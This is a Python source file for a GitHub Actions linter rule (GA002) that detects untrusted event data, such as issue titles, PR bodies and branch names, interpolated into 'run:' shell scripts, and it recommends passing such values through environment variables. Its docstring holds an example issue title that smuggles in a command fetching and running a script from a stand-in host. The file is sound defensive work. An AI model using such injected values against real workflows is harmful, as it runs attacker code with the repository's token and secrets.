from __future__ import annotations

import re
from collections.abc import Iterable

from patchlint.core.model import Context, Finding
from patchlint.core.registry import rule
from patchlint.parsers.github_actions import iter_steps

EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)

# Context values that anyone who opens an issue, PR, comment or branch can control.
UNTRUSTED = re.compile(
    r"github\.(?:"
    r"head_ref"
    r"|event\.(?:"
    r"issue\.(?:title|body)"
    r"|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body"
    r"|discussion\.(?:title|body)"
    r"|pages\S*?\.page_name"
    r"|commits\S*?\.(?:message|author\.(?:email|name))"
    r"|head_commit\.(?:message|author\.(?:email|name))"
    r"|workflow_run\.(?:head_branch|display_title|head_commit\.message)"
    r"))"
)

# In a composite action the caller sets `inputs.*`, so treat them as untrusted too.
ACTION_INPUT = re.compile(r"(?<![\w.])inputs\.[\w-]+")


@rule(
    id="GA002",
    title="Untrusted input in a run script",
    severity="high",
    cwe=78,
    extra_filetypes=("action",),
)
def check(ctx: Context) -> Iterable[Finding]:
    """A `run:` script pastes attacker-controlled data in with `${{ ... }}`.

    Why it matters: GitHub substitutes `${{ ... }}` into the script text before
    the shell runs it. An issue titled `"; curl evil.sh | sh; "` then becomes
    shell code that runs with the workflow's token and secrets. In a composite
    action, `${{ inputs.* }}` counts as untrusted too: the calling workflow sets
    it and may pass event data straight through.

    Fix: pass the value through an environment variable and quote it.

        - env:
            TITLE: ${{ github.event.issue.title }}
          run: echo "New issue: $TITLE"
    """
    doc = ctx.workflow if ctx.workflow is not None else ctx.action
    if doc is None:
        return
    for _job_id, step in iter_steps(doc):
        script = step.get("run")
        if not isinstance(script, str):
            continue
        start = step.key_lines["run"]
        for match in EXPRESSION.finditer(script):
            source = UNTRUSTED.search(match.group(1))
            if source is None and ctx.action is not None:
                caller = ACTION_INPUT.search(match.group(1))
                if caller:
                    yield ctx.finding(
                        ctx.line_of(match.group(0), start),
                        f"`{caller.group(0)}` is set by the action's caller and is pasted "
                        "into the script.",
                        "Move it to `env:` and use the variable, quoted, in the script.",
                    )
            if source:
                yield ctx.finding(
                    ctx.line_of(match.group(0), start),
                    f"`{source.group(0)}` is attacker-controlled and is pasted into the script.",
                    "Move it to `env:` and use the variable, quoted, in the script.",
                )
